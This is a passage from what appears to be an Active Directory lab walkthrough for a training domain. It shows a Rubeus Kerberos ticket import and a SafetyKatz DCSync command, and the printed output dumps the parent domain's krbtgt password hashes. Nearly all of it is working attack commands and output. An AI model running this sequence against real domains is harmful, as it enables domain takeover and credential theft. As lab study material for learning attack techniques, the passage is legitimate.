WXd8HE4jRhAo6ehBgoKBbKvY2pNMY2Gep2mZyTrCBwJUgqcwyhIrKnxyIAo5EQ7PKmmSTXkfwM7Bjf3dUvNuKEPPlYEtyYP6EKxcZ5nVNvr7RcTMGkrWMnlkZPp3f2vOOcumqSOpyzwsVzNKh2nbLmAhyeBe4uaWj6ZpKko5vu1y0KOB8DCB7aADAgEAooHlBIHifYHfMIHcoIHZMIHWMIHToCswKaADAgESoSIEIHaGtAU9lBoI1hc108p5XVz3bo4OMS3Ctq7bedkHX47goREbD01PTkVZQ09SUC5MT0NBTKIWMBSgAwIBAaENMAsbCU1DT1JQLURDJKMHAwUAYKEAAKURGA8yMDIzMDUwMjEzMzUyM1qmERgPMjAyMzA1MDIyMzM1MjNapxEYDzIwMjMwNTA5MDQwMjQ4WqgRGw9NT05FWUNPUlAuTE9DQUypJDAioAMCAQKhGzAZGwZrcmJ0Z3QbD01PTkVZQ09SUC5MT0NBTA==

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


[*] Action: Import Ticket
[+] Ticket successfully imported!

C:\Windows\system32>klist

Current LogonId is 0:0x7bc1b51

Cached Tickets: (1)

#0>     Client: MCORP-DC$ @ MONEYCORP.LOCAL
        Server: krbtgt/MONEYCORP.LOCAL @ MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize
        Start Time: 5/2/2023 6:35:23 (local)
        End Time:   5/2/2023 16:35:23 (local)
        Renew Time: 5/8/2023 21:02:48 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Dcsync attack from parent root Domain controller:

```
C:\AD\Tools\SafetyKatz.exe "privilege::debug" "lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::dcsync /user:mcorp\krbtgt /domain:moneycorp.local
[DC] 'moneycorp.local' will be the domain
[DC] 'mcorp-dc.moneycorp.local' will be the DC server
[DC] 'mcorp\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 11/11/2022 10:46:24 PM
Object Security ID   : S-1-5-21-335606122-960912869-3279953914-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: a0981492d5dfab1ae0b97b51ea895ddf
    ntlm- 0: a0981492d5dfab1ae0b97b51ea895ddf
    lm  - 0: 87836055143ad5a507de2aaeb9000361

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 7c7a5135513110d108390ee6c322423f

* Primary:Kerberos-Newer-Keys *
    Default Salt : MONEYCORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e
      aes128_hmac       (4096) : 801bb69b81ef9283f280b97383288442
      des_cbc_md5       (4096) : c20dc80d51f7abd9

* Primary:Kerberos *
    Default Salt : MONEYCORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : c20dc80d51f7abd9

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  49fec950691bbeba1b0d33d5a48d0293
    02  0b0c4dbc527ee3154877e070d043cd0d
    03  987346e7f810d2b616da385b0c2549ec
    04  49fec950691bbeba1b0d33d5a48d0293
    05  0b0c4dbc527ee3154877e070d043cd0d
    06  333eda93ecfba8d60c57be7f59b14c62
    07  49fec950691bbeba1b0d33d5a48d0293
    08  cdf2b153a374773dc94ee74d14610428
    09  cdf2b153a374773dc94ee74d14610428
    10  a6687f8a2a0a6dfd7c054d63c0568e61
    11  3cf736e35d2a54f1b0c3345005d3f962
    12  cdf2b153a374773dc94ee74d14610428
    13  50f935f7e1b88f89fba60ed23c8d115c
    14  3cf736e35d2a54f1b0c3345005d3f962
    15  06c616b2109569ddd69c8fc00c6a413c
    16  06c616b2109569ddd69c8fc00c6a413c
    17  179b9c2fd5a34cbb6013df534bf05726
    18  5f217f838649436f34bbf13ccb127f44
    19  3564c9de46ad690b83268cde43c21854
    20  1caa9da91c85a1e176fb85cdefc57587
    21  27b7de3c5a16e7629659152656022831
    22  27b7de3c5a16e7629659152656022831
    23  65f5f95db76e43bd6c4ad216b7577604
    24  026c59a45699b631621233cb38733174
    25  026c59a45699b631621233cb38733174
    26  342a52ec1d3b39d90af55460bcda72e8
    27  ef1e1a688748f79d16e8e32318f51465
    28  9e93ee8e0bcccb1451face3dba22cc69
    29  480da975c1dfc76717a63edc6bb29d7b


mimikatz(commandline) # exit
Bye!

```
